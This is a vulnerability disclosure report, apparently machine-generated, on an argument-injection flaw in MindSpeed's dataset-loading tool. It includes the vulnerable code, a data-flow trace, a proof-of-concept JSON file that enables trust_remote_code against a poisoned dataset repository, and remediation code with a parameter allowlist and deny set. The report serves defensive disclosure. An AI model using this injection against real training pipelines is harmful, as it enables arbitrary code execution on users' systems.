# Vulnerability Detail Report: Arbitrary Parameter Injection in load_dataset

## Summary

| Attribute | Value |
|-----------|-------|
| **Vulnerability ID** | VULN-tools-load_dataset-001 |
| **Type** | Arbitrary Parameter Injection (CWE-88) |
| **Severity** | High |
| **CVSS Score** | 7.8 (High) |
| **Affected Files** | `tools/data_handler.py`, `tools/preprocess_data.py` |
| **Affected Function** | `build_dataset()` |
| **Lines of Code** | `tools/data_handler.py:510-513` |

## Description

Untrusted command-line argument `--hf-datasets-params` is loaded as JSON from a user-specified file and passed directly to `load_dataset(**param_dict)` without any validation or sanitization. This allows attackers to inject arbitrary parameters including `trust_remote_code=True`, enabling potential remote code execution when loading malicious HuggingFace datasets.

## Vulnerable Code

### tools/data_handler.py (Lines 510-513)
```python
if args.hf_datasets_params:
    with open(args.hf_datasets_params, 'r') as fin:
        param_dict = json.load(fin)
    return load_dataset(**param_dict)  # No validation of param_dict
```

### tools/preprocess_data.py (Lines 93-94)
```python
group.add_argument('--hf-datasets-params', default=None,
                   help='huggingface load_dataset params')
```

### tools/preprocess_data.py (Lines 172-179)
```python
def main():
    args = get_args()  # Parses command line, including --hf-datasets-params
    # ...
    raw_data = build_dataset(args)  # Passes untrusted args to vulnerable function
```

## Data Flow Analysis

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ Entry Point: tools/preprocess_data.py - main()                               │
│ Type: cmdline (untrusted_local)                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ argv → argparse.parse_args() → args.hf_datasets_params                      │
│ (User-controlled file path)                                                   │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ json.load(fin) → param_dict (untrusted JSON content)                         │
│ NO VALIDATION of keys or values                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ Sink: load_dataset(**param_dict)                                             │
│ Allows injection of ANY parameter including trust_remote_code=True           │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Proof of Concept

### Step 1: Create Malicious Parameter File
```json
{
    "path": "malicious-user/poisoned-dataset",
    "trust_remote_code": true,
    "download_mode": "force_redownload"
}
```

### Step 2: Execute Attack
```bash
python tools/preprocess_data.py \
    --hf-datasets-params malicious_params.json \
    --tokenizer-type PretrainedFromHF \
    --tokenizer-name-or-path gpt2 \
    --output-prefix output
```

### Attack Outcome
When `trust_remote_code=True` is set, the HuggingFace `datasets` library will:
1. Download the dataset's custom loading script from the remote repository
2. Execute that script with full Python privileges
3. An attacker who controls the dataset repository can execute arbitrary code

## Impact Assessment

### Confidentiality: HIGH
- Attacker can read arbitrary files from the system
- Can exfiltrate environment variables, secrets, and credentials

### Integrity: HIGH
- Attacker can modify or delete any files accessible to the process
- Can inject malicious data into the training pipeline

### Availability: HIGH
- Attacker can crash the system or cause denial of service
- Can corrupt datasets or training outputs

### Attack Vector: LOCAL
- Requires ability to pass command-line arguments or modify JSON file
- Social engineering could trick users into using malicious parameter files

## Evidence of Known Risk Awareness

The project demonstrates awareness of `trust_remote_code` risks in other code locations:

### mindspeed/tokenizer/tokenizer.py (Line 75)
```python
hf_tokenizer_kwargs["trust_remote_code"] = False  # Explicitly disabled
```

### mindspeed/tokenizer/build_tokenizer/adaptor.py (Line 58)
```python
hf_tokenizer_kwargs["trust_remote_code"] = False  # Explicitly disabled
```

### docs/zh/SECURITYNOTE.md (Line 121)
> 如果trust_remote_code=True，下载的代码可能包含恶意逻辑或后门，威胁系统安全。

**However, the `build_dataset()` function in `tools/data_handler.py` lacks this protection.**

## Root Cause Analysis

1. **Missing Input Validation**: No whitelist or blacklist for allowed `load_dataset()` parameters
2. **Indirect Injection Vector**: JSON file path parameter provides indirect injection capability
3. **Inconsistent Security Practices**: Protection applied in tokenizer code but not in dataset loading code
4. **Trust Boundary Violation**: User-provided parameters directly passed to sensitive API

## Recommended Remediation

### Option 1: Parameter Whitelist (Recommended)
```python
ALLOWED_DATASET_PARAMS = {
    'path', 'name', 'data_dir', 'data_files', 'split',
    'cache_dir', 'features', 'download_mode', 'num_proc',
    'storage_options', 'verification_mode', 'keep_in_memory',
    'save_infos', 'revision', 'token', 'proxies'
}

def build_dataset(args):
    if args.hf_datasets_params:
        with open(args.hf_datasets_params, 'r') as fin:
            param_dict = json.load(fin)
        
        # Security: Filter to allowed parameters only
        safe_params = {k: v for k, v in param_dict.items() 
                       if k in ALLOWED_DATASET_PARAMS}
        
        # Security: Never allow trust_remote_code
        safe_params['trust_remote_code'] = False
        
        return load_dataset(**safe_params)
    # ... rest of function
```

### Option 2: Explicit Parameter Handling
```python
def build_dataset(args):
    if args.hf_datasets_params:
        with open(args.hf_datasets_params, 'r') as fin:
            param_dict = json.load(fin)
        
        # Log warning for suspicious parameters
        dangerous_params = {'trust_remote_code', 'script_version'}
        found_dangerous = set(param_dict.keys()) & dangerous_params
        if found_dangerous:
            logger.warning(f"Security: Rejecting dangerous parameters: {found_dangerous}")
        
        # Explicitly set safe defaults
        param_dict['trust_remote_code'] = False
        
        return load_dataset(**param_dict)
    # ... rest of function
```

### Option 3: Dedicated CLI Arguments (Most Secure)
Replace `--hf-datasets-params` with explicit, individual CLI arguments:
```python
group.add_argument('--dataset-path', type=str, help='Dataset path or name')
group.add_argument('--dataset-name', type=str, help='Dataset configuration name')
group.add_argument('--dataset-split', type=str, default='train', help='Dataset split')
# ... etc
```

## Additional Security Considerations

1. **Input File Validation**: Validate that `args.hf_datasets_params` points to a legitimate location
2. **JSON Schema Validation**: Implement JSON schema validation for the parameter file
3. **Audit Logging**: Log all dataset loading parameters for security monitoring
4. **Documentation**: Update SECURITYNOTE.md to document this parameter injection risk

## References

- **CWE-88**: Argument Injection or Modification
- **HuggingFace Documentation**: [Security considerations for trust_remote_code](https://huggingface.co/docs/datasets/security)
- **Related CVE**: Similar patterns have led to CVEs in ML tooling

## Verification Status

| Check | Status |
|-------|--------|
| Vulnerability confirmed | ✅ Yes |
| Attack vector valid | ✅ Yes |
| Impact realistic | ✅ Yes |
| Remediation provided | ✅ Yes |
| Consistent with CWE-88 | ✅ Yes |

## Metadata

- **Analyzed by**: details-worker
- **Analysis Date**: 2026-04-20
- **Project**: MindSpeed
- **Repository**: /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed
